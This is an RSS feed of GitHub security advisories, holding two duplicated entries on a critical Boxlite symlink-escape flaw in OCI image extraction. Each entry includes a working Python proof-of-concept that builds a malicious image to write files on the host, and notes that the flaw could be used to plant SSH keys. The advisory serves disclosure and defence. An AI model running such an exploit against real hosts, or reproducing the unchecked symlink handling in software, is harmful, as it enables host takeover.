<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2026-05-24T05:16:19.537Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[boxlite] Boxlite: Path Traversal Vulnerability Leads to Arbitrary File Write on the Host]]></title>
        <id>https://github.com/advisories/GHSA-f396-4rp4-7v2j</id>
        <link href="https://github.com/advisories/GHSA-f396-4rp4-7v2j"/>
        <updated>2026-05-21T21:54:16.000Z</updated>
        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
<p>Boxlite is a sandbox service that allows users to create lightweight virtual machines (Boxes) and run OCI containers within them. Boxlite allows users to specify the OCI image used by containers in the sandbox. However, when processing tar entries in OCI images, Boxlite does not account for the possibility that entries may be symlinks pointing to absolute paths. An attacker can craft a malicious OCI image and distribute it on image hosting platforms such as DockerHub, tricking users into using it. Once a user loads the malicious image, the attacker can write arbitrary content to any path on the host, which can further lead to remote code execution on the host.</p>
<h4 id="details">Details</h4>
<ol>
<li>Entry Point — OCI Layer Tarball Extraction</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>extract_layer_tarball_streaming()</code> (line 24) <strong>Code:</strong></p>
<pre><code class="language-rust">pub fn extract_layer_tarball_streaming(tarball_path: &amp;Path, dest: &amp;Path) -&gt; BoxliteResult&lt;u64&gt; {
    // ...
    apply_oci_layer(reader, dest)
}
</code></pre>
<p><strong>Issue:</strong> The function passes the tar reader into <code>apply_oci_layer</code>. The tarball comes from a registry blob that has passed SHA256 integrity verification against the manifest digest — but the manifest itself is controlled by the registry, so a malicious registry can serve a valid manifest pointing to a crafted layer blob with a matching digest.</p>
<ol start="2">
<li>Main Extraction Loop — Symlink Created Without Target Validation</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>apply_oci_layer()</code> (line 196) <strong>Code:</strong></p>
<pre><code class="language-rust">EntryType::Symlink =&gt; {
    let target = link_name.ok_or_else(|| { /* ... */ })?;
    create_symlink(&amp;full_path, &amp;target)?;  // line 327 — target is NOT validated
}
</code></pre>
<p><strong>Issue:</strong> The symlink's <code>full_path</code> (the link itself) is sanitized by <code>normalize_entry_path</code> to stay within <code>dest</code>. However, the <code>target</code> (what the symlink points to) is never validated. An entry with path <code>usr</code> and link target <code>/etc</code> creates <code>{dest}/usr -&gt; /etc</code>, a symlink pointing outside the extraction root. There is no check that <code>target</code> stays within <code>dest</code>, is relative, or doesn't escape the container root.</p>
<ol start="3">
<li>Symlink Target Written Verbatim</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>create_symlink()</code> (line 747) <strong>Code:</strong></p>
<pre><code class="language-rust">fn create_symlink(path: &amp;Path, target: &amp;Path) -&gt; BoxliteResult&lt;()&gt; {
    std::os::unix::fs::symlink(target, path).map_err(|e| { /* ... */ })
}
</code></pre>
<p><strong>Issue:</strong> <code>std::os::unix::fs::symlink</code> is an <code>lstat</code>-level operation — it creates the symlink with the provided target string verbatim, no matter what it contains. If <code>target</code> is <code>/etc</code>, the link records <code>/etc</code> as the target. No containment check.</p>
<ol start="4">
<li>ensure_parent_dirs Deliberately Follows and Preserves Escape Symlinks</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>ensure_parent_dirs()</code> (line 457) <strong>Code:</strong></p>
<pre><code class="language-rust">Ok(m) if m.file_type().is_symlink() =&gt; {
    // Check if symlink points to a directory
    match fs::metadata(current_check) {  // follows symlink
        Ok(target_m) if target_m.is_dir() =&gt; {
            trace!("Preserving symlink that points to directory: ...");
            break;  // line 516 — stop, keep the symlink, treat as valid parent
        }
</code></pre>
<p><strong>Issue:</strong> When the next tar entry has path <code>usr/passwd</code> and the code calls <code>ensure_parent_dirs("{dest}/usr/passwd", dest)</code>, it walks up to <code>{dest}/usr</code>, finds it is a symlink pointing to a directory (e.g., <code>/etc</code>), and explicitly <strong>breaks</strong> the loop to preserve it — treating the out-of-root symlink as a valid, navigable parent. The <code>create_dir_all</code> call is then skipped for this path. The caller proceeds to open and write <code>{dest}/usr/passwd</code>, which the kernel resolves through the symlink to <code>/etc/passwd</code>.</p>
<ol start="5">
<li>File Written Through Escaped Symlink</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>create_regular_file()</code> (line 715) <strong>Code:</strong></p>
<pre><code class="language-rust">fn create_regular_file&lt;R: Read&gt;(entry: &amp;mut Entry&lt;R&gt;, path: &amp;Path, mode: u32) -&gt; BoxliteResult&lt;()&gt; {
    let mut file = OpenOptions::new()
        .write(true).create(true).truncate(true).mode(mode)
        .open(path)   // path = "{dest}/usr/passwd" which kernel follows to "/etc/passwd"
        .map_err(|e| { /* ... */ })?;
    io::copy(entry, &amp;mut file)?;   // attacker-controlled content written to /etc/passwd
    Ok(())
}
</code></pre>
<p><strong>Issue:</strong> <code>OpenOptions::open()</code> follows symlinks in path components by default. The kernel resolves <code>{dest}/usr/passwd</code> → <code>{dest}/usr</code> is a symlink to <code>/etc</code> → file opened at <code>/etc/passwd</code>. Attacker-controlled tar entry content is copied there verbatim.</p>
<p>As seen from the code, when a tar entry is a symlink, Boxlite's security checks are insufficient. An attacker can exploit this vulnerability to achieve arbitrary file write once a user loads a maliciously crafted image. The write permission is consistent with the process privilege running the Boxlite service, which is commonly root on Linux. The attacker can further leverage this capability to achieve remote code execution, such as writing the attacker's public key into the host's authorized_keys.</p>
<h4 id="poc">PoC</h4>
<ol>
<li><p>Install Boxlite following the official tutorial.</p>
</li>
<li><p>Run the following Python script:</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC: BoxLite OCI Layer Extraction Symlink Escape
=================================================

Vulnerability: boxlite/src/images/archive/tar.rs — extract_layer_tarball_streaming()
Type:          CWE-61 / CAPEC-132 — Symlink Following during tar extraction

Attack:
  OCI images consist of layer tarballs extracted on the host to build the ext4
  base image. If the extractor follows a symlink without verifying the resolved
  path stays within the extraction root, an attacker can craft a tar like:

    [1] SYMLINK  escape  -&gt;  /tmp          (points to host /tmp)
    [2] FILE     escape/poc/pwned.txt       (resolves via [1] to /tmp/poc/pwned.txt)

  KVM hardware isolation is irrelevant here — tar extraction happens in the host
  process before the VM ever starts.

Target write: /tmp/boxlite_host_escape/pwned.txt
Expected isolation boundary: boxlite internal staging dir under /tmp
"""

import asyncio
import hashlib
import io
import json
import os
import shutil
import tarfile
import time

TARGET_FILE = "/tmp/boxlite_host_escape/pwned.txt"
OCI_LAYOUT_DIR = "/tmp/malicious_oci_layout"


# ── Helpers ───────────────────────────────────────────────────────────────────


def sha256hex(data: bytes) -&gt; str:
    return hashlib.sha256(data).hexdigest()


def add_entry(
    tf: tarfile.TarFile,
    name: str,
    type_: bytes,
    linkname: str = "",
    data: bytes = b"",
    mode: int = 0o644,
):
    info = tarfile.TarInfo(name=name)
    info.type = type_
    info.linkname = linkname
    info.size = len(data)
    info.mode = mode
    info.mtime = int(time.time())
    tf.addfile(info, io.BytesIO(data) if data else None)


# ── Step 1: Build malicious OCI layer tar ─────────────────────────────────────


def build_layer_tar() -&gt; bytes:
    """
    Tar entries (order matters):
      [1] SYMLINK  escape            -&gt;  /tmp
      [2] DIR      escape/boxlite_host_escape/     (resolves to /tmp/boxlite_host_escape/)
      [3] FILE     escape/boxlite_host_escape/pwned.txt  (resolves to /tmp/…/pwned.txt)
      [4] FILE     etc/os-release    (legitimate-looking decoy entries)
    """
    payload = (
        "===== BOXLITE SYMLINK ESCAPE: HOST FILESYSTEM WRITE =====\n"
        f"Written at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"Target: {TARGET_FILE}\n"
        "========================================================\n"
    ).encode()

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        add_entry(tf, "escape", tarfile.SYMTYPE, linkname="/tmp", mode=0o777)
        add_entry(tf, "escape/boxlite_host_escape", tarfile.DIRTYPE, mode=0o755)
        add_entry(
            tf, "escape/boxlite_host_escape/pwned.txt", tarfile.REGTYPE, data=payload
        )
        add_entry(
            tf,
            "etc/os-release",
            tarfile.REGTYPE,
            data=b"ID=alpine\nVERSION_ID=3.19.0\n",
        )
    return buf.getvalue()


# ── Step 2: Build OCI image layout ───────────────────────────────────────────


def build_oci_layout(out_dir: str) -&gt; None:
    blobs = os.path.join(out_dir, "blobs", "sha256")
    os.makedirs(blobs, exist_ok=True)

    def write_blob(data: bytes) -&gt; tuple[str, int]:
        dgst = sha256hex(data)
        with open(os.path.join(blobs, dgst), "wb") as f:
            f.write(data)
        return dgst, len(data)

    layer_bytes = build_layer_tar()
    layer_dgst, layer_sz = write_blob(layer_bytes)

    config_bytes = json.dumps(
        {
            "architecture": "amd64",
            "os": "linux",
            "config": {"Cmd": ["/bin/sh"]},
            "rootfs": {"type": "layers", "diff_ids": [f"sha256:{layer_dgst}"]},
        }
    ).encode()
    cfg_dgst, cfg_sz = write_blob(config_bytes)

    manifest_bytes = json.dumps(
        {
            "schemaVersion": 2,
            "mediaType": "application/vnd.oci.image.manifest.v1+json",
            "config": {
                "mediaType": "application/vnd.oci.image.config.v1+json",
                "digest": f"sha256:{cfg_dgst}",
                "size": cfg_sz,
            },
            "layers": [
                {
                    "mediaType": "application/vnd.oci.image.layer.v1.tar",
                    "digest": f"sha256:{layer_dgst}",
                    "size": layer_sz,
                }
            ],
        }
    ).encode()
    mf_dgst, mf_sz = write_blob(manifest_bytes)

    with open(os.path.join(out_dir, "index.json"), "w") as f:
        json.dump(
            {
                "schemaVersion": 2,
                "manifests": [
                    {
                        "mediaType": "application/vnd.oci.image.manifest.v1+json",
                        "digest": f"sha256:{mf_dgst}",
                        "size": mf_sz,
                        "annotations": {"org.opencontainers.image.ref.name": "latest"},
                    }
                ],
            },
            f,
        )

    with open(os.path.join(out_dir, "oci-layout"), "w") as f:
        json.dump({"imageLayoutVersion": "1.0.0"}, f)

    print(f"  layer    sha256:{layer_dgst[:16]}…  ({layer_sz} B)")
    print(f"  config   sha256:{cfg_dgst[:16]}…  ({cfg_sz} B)")
    print(f"  manifest sha256:{mf_dgst[:16]}…  ({mf_sz} B)")


# ── Main ──────────────────────────────────────────────────────────────────────


async def main():
    print("=" * 60)
    print("  PoC: BoxLite OCI Layer Extraction Symlink Escape")
    print("=" * 60)

    # Clean up previous run artifacts
    for path in [TARGET_FILE, "/tmp/boxlite_host_escape", OCI_LAYOUT_DIR]:
        if os.path.isfile(path):
            os.remove(path)
        elif os.path.isdir(path):
            shutil.rmtree(path)

    # [1] Build malicious OCI image
    print(f"\n[1] Building malicious OCI image → {OCI_LAYOUT_DIR}")
    build_oci_layout(OCI_LAYOUT_DIR)

    # [2] Show crafted tar entries
    print("\n[2] Malicious layer tar entries:")
    with open(os.path.join(OCI_LAYOUT_DIR, "index.json")) as f:
        idx = json.load(f)
    mf_dgst = idx["manifests"][0]["digest"].split(":")[1]
    with open(os.path.join(OCI_LAYOUT_DIR, "blobs", "sha256", mf_dgst)) as f:
        mf = json.load(f)
    lyr_dgst = mf["layers"][0]["digest"].split(":")[1]
    lyr_data = open(
        os.path.join(OCI_LAYOUT_DIR, "blobs", "sha256", lyr_dgst), "rb"
    ).read()
    with tarfile.open(fileobj=io.BytesIO(lyr_data)) as tf:
        for m in tf.getmembers():
            tstr = {
                tarfile.REGTYPE: "FILE   ",
                tarfile.SYMTYPE: "SYMLINK",
                tarfile.DIRTYPE: "DIR    ",
            }.get(m.type, f"?{m.type}   ")
            suffix = f" -&gt; {m.linkname}" if m.issym() else ""
            print(f"    {tstr}  {m.name}{suffix}")

    # [3] Confirm target absent before exploit
    print(f"\n[3] Pre-exploit — target exists? {os.path.exists(TARGET_FILE)}")

    # [4] Trigger extraction (vulnerability fires before VM starts)
    print(f"\n[4] Loading malicious image via boxlite.SimpleBox(rootfs_path=…)")
    import boxlite

    try:
        async with boxlite.SimpleBox(rootfs_path=OCI_LAYOUT_DIR) as box:
            r = await box.exec("sh", "-c", "echo ok")
            print(f"    VM stdout: {r.stdout.strip()}")
    except Exception as e:
        # Box may fail to start (incomplete rootfs) — that's fine;
        # the symlink escape occurs during layer extraction, before VM launch.
        print(f"    Box error (expected): {type(e).__name__}: {e}")

    # [5] Verify host write
    print(f"\n[5] Post-exploit — target exists? {os.path.exists(TARGET_FILE)}")
    if os.path.exists(TARGET_FILE):
        print(f"\n  VULNERABLE — host file written successfully!")
        print(f"  Path: {TARGET_FILE}")
        print(open(TARGET_FILE).read())
    else:
        print("\n  NOT VULNERABLE (or already patched)")


if __name__ == "__main__":
    asyncio.run(main())
</code></pre>
<p>This script constructs a malicious OCI image and passes it to the SimpleBox function via rootfs_path to create a container. In the malicious image, a symlink is first created pointing <code>escape</code> to <code>/tmp</code>, and then files are written under <code>escape</code>, thereby achieving file writes to the root filesystem.</p>
<p>Sample output:</p>
<pre><code>$ python3 poc_symlink_escape.py
============================================================
  PoC: BoxLite OCI Layer Extraction Symlink Escape
============================================================

[1] Building malicious OCI image → /tmp/malicious_oci_layout
  layer    sha256:a1e8b4de11d64fce…  (10240 B)
  config   sha256:8e245c2c65565998…  (191 B)
  manifest sha256:2dad6671e78d8093…  (415 B)

[2] Malicious layer tar entries:
    SYMLINK  escape -&gt; /tmp
    DIR      escape/boxlite_host_escape
    FILE     escape/boxlite_host_escape/pwned.txt
    FILE     etc/os-release

[3] Pre-exploit — target exists? False

[4] Loading malicious image via boxlite.SimpleBox(rootfs_path=…)
    Box error (expected): RuntimeError: internal error: Container init failed: Failed to start container: internal error: Failed to create container b673b4e3400c71bd72464c98610c952e2164f70f946873b82adf3e6212851d54 at bundle /run/boxlite/containers/b673b4e3400c71bd72464c98610c952e2164f70f946873b82adf3e6212851d54: failed to create container: exec process failed with error error in executing process : PATH environment variable is not set

[5] Post-exploit — target exists? True

  VULNERABLE — host file written successfully!
  Path: /tmp/boxlite_host_escape/pwned.txt
===== BOXLITE SYMLINK ESCAPE: HOST FILESYSTEM WRITE =====
Written at: ...
Target: /tmp/boxlite_host_escape/pwned.txt
========================================================
</code></pre>
</li>
</ol>
<h4 id="impact">Impact</h4>
<p>An attacker can craft a malicious OCI image and distribute it on image hosting platforms such as DockerHub, tricking users into using it. Once a user loads the malicious image, the attacker can write arbitrary content to any path on the host, which can further lead to remote code execution on the host.</p>
<h4 id="score">Score</h4>
<p>Severity: Critical, Score: 9.7, rationale as follows:</p>
<ul>
<li>AV:N — The attacker can distribute the malicious image over the network, tricking users into pulling and using it</li>
<li>AC:L — This is a logic vulnerability that requires no complex exploitation</li>
<li>PR:N — The attacker does not need any additional privileges to exploit this vulnerability</li>
<li>UI:R — The attacker needs to trick the victim into using the maliciously crafted image</li>
<li>S:C — The attacker can leverage the vulnerability to achieve arbitrary command execution on the host, extending the impact to the host operating system and crossing the security boundary</li>
<li>C:H/I:H/A:H — The attacker can leverage the vulnerability to gain RCE capability on the host, posing a significant threat to confidentiality, integrity, and availability</li>
</ul>
<h4 id="credit">Credit</h4>
<p>This vulnerability was discovered by:</p>
<ul>
<li>XlabAI Team of Tencent Xuanwu Lab</li>
<li>Atuin Automated Vulnerability Discovery Engine</li>
</ul>
<p>If there are any questions regarding the vulnerability details, please feel free to reach out to BoxLite for further discussion by emailing <a href="mailto:xlabai@tencent.com">xlabai@tencent.com</a>.</p>
<h4 id="note">Note</h4>
<p>Note that Boxlite follows the industry-standard <strong>90+30 disclosure policy</strong> (Reference: <a href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html">https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html</a>). This means that BoxLite reserves the right to disclose the details of the vulnerability 30 days after the fix has been implemented.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-f396-4rp4-7v2j">https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-f396-4rp4-7v2j</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0148.html">https://rustsec.org/advisories/RUSTSEC-2026-0148.html</a></li>
<li><a href="https://github.com/advisories/GHSA-f396-4rp4-7v2j">https://github.com/advisories/GHSA-f396-4rp4-7v2j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f396-4rp4-7v2j</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-21T21:54:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[boxlite-cli] Boxlite: Path Traversal Vulnerability Leads to Arbitrary File Write on the Host]]></title>
        <id>https://github.com/advisories/GHSA-f396-4rp4-7v2j</id>
        <link href="https://github.com/advisories/GHSA-f396-4rp4-7v2j"/>
        <updated>2026-05-21T21:54:16.000Z</updated>
        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
<p>Boxlite is a sandbox service that allows users to create lightweight virtual machines (Boxes) and run OCI containers within them. Boxlite allows users to specify the OCI image used by containers in the sandbox. However, when processing tar entries in OCI images, Boxlite does not account for the possibility that entries may be symlinks pointing to absolute paths. An attacker can craft a malicious OCI image and distribute it on image hosting platforms such as DockerHub, tricking users into using it. Once a user loads the malicious image, the attacker can write arbitrary content to any path on the host, which can further lead to remote code execution on the host.</p>
<h4 id="details">Details</h4>
<ol>
<li>Entry Point — OCI Layer Tarball Extraction</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>extract_layer_tarball_streaming()</code> (line 24) <strong>Code:</strong></p>
<pre><code class="language-rust">pub fn extract_layer_tarball_streaming(tarball_path: &amp;Path, dest: &amp;Path) -&gt; BoxliteResult&lt;u64&gt; {
    // ...
    apply_oci_layer(reader, dest)
}
</code></pre>
<p><strong>Issue:</strong> The function passes the tar reader into <code>apply_oci_layer</code>. The tarball comes from a registry blob that has passed SHA256 integrity verification against the manifest digest — but the manifest itself is controlled by the registry, so a malicious registry can serve a valid manifest pointing to a crafted layer blob with a matching digest.</p>
<ol start="2">
<li>Main Extraction Loop — Symlink Created Without Target Validation</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>apply_oci_layer()</code> (line 196) <strong>Code:</strong></p>
<pre><code class="language-rust">EntryType::Symlink =&gt; {
    let target = link_name.ok_or_else(|| { /* ... */ })?;
    create_symlink(&amp;full_path, &amp;target)?;  // line 327 — target is NOT validated
}
</code></pre>
<p><strong>Issue:</strong> The symlink's <code>full_path</code> (the link itself) is sanitized by <code>normalize_entry_path</code> to stay within <code>dest</code>. However, the <code>target</code> (what the symlink points to) is never validated. An entry with path <code>usr</code> and link target <code>/etc</code> creates <code>{dest}/usr -&gt; /etc</code>, a symlink pointing outside the extraction root. There is no check that <code>target</code> stays within <code>dest</code>, is relative, or doesn't escape the container root.</p>
<ol start="3">
<li>Symlink Target Written Verbatim</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>create_symlink()</code> (line 747) <strong>Code:</strong></p>
<pre><code class="language-rust">fn create_symlink(path: &amp;Path, target: &amp;Path) -&gt; BoxliteResult&lt;()&gt; {
    std::os::unix::fs::symlink(target, path).map_err(|e| { /* ... */ })
}
</code></pre>
<p><strong>Issue:</strong> <code>std::os::unix::fs::symlink</code> is an <code>lstat</code>-level operation — it creates the symlink with the provided target string verbatim, no matter what it contains. If <code>target</code> is <code>/etc</code>, the link records <code>/etc</code> as the target. No containment check.</p>
<ol start="4">
<li>ensure_parent_dirs Deliberately Follows and Preserves Escape Symlinks</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>ensure_parent_dirs()</code> (line 457) <strong>Code:</strong></p>
<pre><code class="language-rust">Ok(m) if m.file_type().is_symlink() =&gt; {
    // Check if symlink points to a directory
    match fs::metadata(current_check) {  // follows symlink
        Ok(target_m) if target_m.is_dir() =&gt; {
            trace!("Preserving symlink that points to directory: ...");
            break;  // line 516 — stop, keep the symlink, treat as valid parent
        }
</code></pre>
<p><strong>Issue:</strong> When the next tar entry has path <code>usr/passwd</code> and the code calls <code>ensure_parent_dirs("{dest}/usr/passwd", dest)</code>, it walks up to <code>{dest}/usr</code>, finds it is a symlink pointing to a directory (e.g., <code>/etc</code>), and explicitly <strong>breaks</strong> the loop to preserve it — treating the out-of-root symlink as a valid, navigable parent. The <code>create_dir_all</code> call is then skipped for this path. The caller proceeds to open and write <code>{dest}/usr/passwd</code>, which the kernel resolves through the symlink to <code>/etc/passwd</code>.</p>
<ol start="5">
<li>File Written Through Escaped Symlink</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/images/archive/tar.rs</code> <strong>Function:</strong> <code>create_regular_file()</code> (line 715) <strong>Code:</strong></p>
<pre><code class="language-rust">fn create_regular_file&lt;R: Read&gt;(entry: &amp;mut Entry&lt;R&gt;, path: &amp;Path, mode: u32) -&gt; BoxliteResult&lt;()&gt; {
    let mut file = OpenOptions::new()
        .write(true).create(true).truncate(true).mode(mode)
        .open(path)   // path = "{dest}/usr/passwd" which kernel follows to "/etc/passwd"
        .map_err(|e| { /* ... */ })?;
    io::copy(entry, &amp;mut file)?;   // attacker-controlled content written to /etc/passwd
    Ok(())
}
</code></pre>
<p><strong>Issue:</strong> <code>OpenOptions::open()</code> follows symlinks in path components by default. The kernel resolves <code>{dest}/usr/passwd</code> → <code>{dest}/usr</code> is a symlink to <code>/etc</code> → file opened at <code>/etc/passwd</code>. Attacker-controlled tar entry content is copied there verbatim.</p>
<p>As seen from the code, when a tar entry is a symlink, Boxlite's security checks are insufficient. An attacker can exploit this vulnerability to achieve arbitrary file write once a user loads a maliciously crafted image. The write permission is consistent with the process privilege running the Boxlite service, which is commonly root on Linux. The attacker can further leverage this capability to achieve remote code execution, such as writing the attacker's public key into the host's authorized_keys.</p>
<h4 id="poc">PoC</h4>
<ol>
<li><p>Install Boxlite following the official tutorial.</p>
</li>
<li><p>Run the following Python script:</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC: BoxLite OCI Layer Extraction Symlink Escape
=================================================

Vulnerability: boxlite/src/images/archive/tar.rs — extract_layer_tarball_streaming()
Type:          CWE-61 / CAPEC-132 — Symlink Following during tar extraction

Attack:
  OCI images consist of layer tarballs extracted on the host to build the ext4
  base image. If the extractor follows a symlink without verifying the resolved
  path stays within the extraction root, an attacker can craft a tar like:

    [1] SYMLINK  escape  -&gt;  /tmp          (points to host /tmp)
    [2] FILE     escape/poc/pwned.txt       (resolves via [1] to /tmp/poc/pwned.txt)

  KVM hardware isolation is irrelevant here — tar extraction happens in the host
  process before the VM ever starts.

Target write: /tmp/boxlite_host_escape/pwned.txt
Expected isolation boundary: boxlite internal staging dir under /tmp
"""

import asyncio
import hashlib
import io
import json
import os
import shutil
import tarfile
import time

TARGET_FILE = "/tmp/boxlite_host_escape/pwned.txt"
OCI_LAYOUT_DIR = "/tmp/malicious_oci_layout"


# ── Helpers ───────────────────────────────────────────────────────────────────


def sha256hex(data: bytes) -&gt; str:
    return hashlib.sha256(data).hexdigest()


def add_entry(
    tf: tarfile.TarFile,
    name: str,
    type_: bytes,
    linkname: str = "",
    data: bytes = b"",
    mode: int = 0o644,
):
    info = tarfile.TarInfo(name=name)
    info.type = type_
    info.linkname = linkname
    info.size = len(data)
    info.mode = mode
    info.mtime = int(time.time())
    tf.addfile(info, io.BytesIO(data) if data else None)


# ── Step 1: Build malicious OCI layer tar ─────────────────────────────────────


def build_layer_tar() -&gt; bytes:
    """
    Tar entries (order matters):
      [1] SYMLINK  escape            -&gt;  /tmp
      [2] DIR      escape/boxlite_host_escape/     (resolves to /tmp/boxlite_host_escape/)
      [3] FILE     escape/boxlite_host_escape/pwned.txt  (resolves to /tmp/…/pwned.txt)
      [4] FILE     etc/os-release    (legitimate-looking decoy entries)
    """
    payload = (
        "===== BOXLITE SYMLINK ESCAPE: HOST FILESYSTEM WRITE =====\n"
        f"Written at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"Target: {TARGET_FILE}\n"
        "========================================================\n"
    ).encode()

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        add_entry(tf, "escape", tarfile.SYMTYPE, linkname="/tmp", mode=0o777)
        add_entry(tf, "escape/boxlite_host_escape", tarfile.DIRTYPE, mode=0o755)
        add_entry(
            tf, "escape/boxlite_host_escape/pwned.txt", tarfile.REGTYPE, data=payload
        )
        add_entry(
            tf,
            "etc/os-release",
            tarfile.REGTYPE,
            data=b"ID=alpine\nVERSION_ID=3.19.0\n",
        )
    return buf.getvalue()


# ── Step 2: Build OCI image layout ───────────────────────────────────────────


def build_oci_layout(out_dir: str) -&gt; None:
    blobs = os.path.join(out_dir, "blobs", "sha256")
    os.makedirs(blobs, exist_ok=True)

    def write_blob(data: bytes) -&gt; tuple[str, int]:
        dgst = sha256hex(data)
        with open(os.path.join(blobs, dgst), "wb") as f:
            f.write(data)
        return dgst, len(data)

    layer_bytes = build_layer_tar()
    layer_dgst, layer_sz = write_blob(layer_bytes)

    config_bytes = json.dumps(
        {
            "architecture": "amd64",
            "os": "linux",
            "config": {"Cmd": ["/bin/sh"]},
            "rootfs": {"type": "layers", "diff_ids": [f"sha256:{layer_dgst}"]},
        }
    ).encode()
    cfg_dgst, cfg_sz = write_blob(config_bytes)

    manifest_bytes = json.dumps(
        {
            "schemaVersion": 2,
            "mediaType": "application/vnd.oci.image.manifest.v1+json",
            "config": {
                "mediaType": "application/vnd.oci.image.config.v1+json",
                "digest": f"sha256:{cfg_dgst}",
                "size": cfg_sz,
            },
            "layers": [
                {
                    "mediaType": "application/vnd.oci.image.layer.v1.tar",
                    "digest": f"sha256:{layer_dgst}",
                    "size": layer_sz,
                }
            ],
        }
    ).encode()
    mf_dgst, mf_sz = write_blob(manifest_bytes)

    with open(os.path.join(out_dir, "index.json"), "w") as f:
        json.dump(
            {
                "schemaVersion": 2,
                "manifests": [
                    {
                        "mediaType": "application/vnd.oci.image.manifest.v1+json",
                        "digest": f"sha256:{mf_dgst}",
                        "size": mf_sz,
                        "annotations": {"org.opencontainers.image.ref.name": "latest"},
                    }
                ],
            },
            f,
        )

    with open(os.path.join(out_dir, "oci-layout"), "w") as f:
        json.dump({"imageLayoutVersion": "1.0.0"}, f)

    print(f"  layer    sha256:{layer_dgst[:16]}…  ({layer_sz} B)")
    print(f"  config   sha256:{cfg_dgst[:16]}…  ({cfg_sz} B)")
    print(f"  manifest sha256:{mf_dgst[:16]}…  ({mf_sz} B)")


# ── Main ──────────────────────────────────────────────────────────────────────


async def main():
    print("=" * 60)
    print("  PoC: BoxLite OCI Layer Extraction Symlink Escape")
    print("=" * 60)

    # Clean up previous run artifacts
    for path in [TARGET_FILE, "/tmp/boxlite_host_escape", OCI_LAYOUT_DIR]:
        if os.path.isfile(path):
            os.remove(path)
        elif os.path.isdir(path):
            shutil.rmtree(path)

    # [1] Build malicious OCI image
    print(f"\n[1] Building malicious OCI image → {OCI_LAYOUT_DIR}")
    build_oci_layout(OCI_LAYOUT_DIR)

    # [2] Show crafted tar entries
    print("\n[2] Malicious layer tar entries:")
    with open(os.path.join(OCI_LAYOUT_DIR, "index.json")) as f:
        idx = json.load(f)
    mf_dgst = idx["manifests"][0]["digest"].split(":")[1]
    with open(os.path.join(OCI_LAYOUT_DIR, "blobs", "sha256", mf_dgst)) as f:
        mf = json.load(f)
    lyr_dgst = mf["layers"][0]["digest"].split(":")[1]
    lyr_data = open(
        os.path.join(OCI_LAYOUT_DIR, "blobs", "sha256", lyr_dgst), "rb"
    ).read()
    with tarfile.open(fileobj=io.BytesIO(lyr_data)) as tf:
        for m in tf.getmembers():
            tstr = {
                tarfile.REGTYPE: "FILE   ",
                tarfile.SYMTYPE: "SYMLINK",
                tarfile.DIRTYPE: "DIR    ",
            }.get(m.type, f"?{m.type}   ")
            suffix = f" -&gt; {m.linkname}" if m.issym() else ""
            print(f"    {tstr}  {m.name}{suffix}")

    # [3] Confirm target absent before exploit
    print(f"\n[3] Pre-exploit — target exists? {os.path.exists(TARGET_FILE)}")

    # [4] Trigger extraction (vulnerability fires before VM starts)
    print(f"\n[4] Loading malicious image via boxlite.SimpleBox(rootfs_path=…)")
    import boxlite

    try:
        async with boxlite.SimpleBox(rootfs_path=OCI_LAYOUT_DIR) as box:
            r = await box.exec("sh", "-c", "echo ok")
            print(f"    VM stdout: {r.stdout.strip()}")
    except Exception as e:
        # Box may fail to start (incomplete rootfs) — that's fine;
        # the symlink escape occurs during layer extraction, before VM launch.
        print(f"    Box error (expected): {type(e).__name__}: {e}")

    # [5] Verify host write
    print(f"\n[5] Post-exploit — target exists? {os.path.exists(TARGET_FILE)}")
    if os.path.exists(TARGET_FILE):
        print(f"\n  VULNERABLE — host file written successfully!")
        print(f"  Path: {TARGET_FILE}")
        print(open(TARGET_FILE).read())
    else:
        print("\n  NOT VULNERABLE (or already patched)")


if __name__ == "__main__":
    asyncio.run(main())
</code></pre>
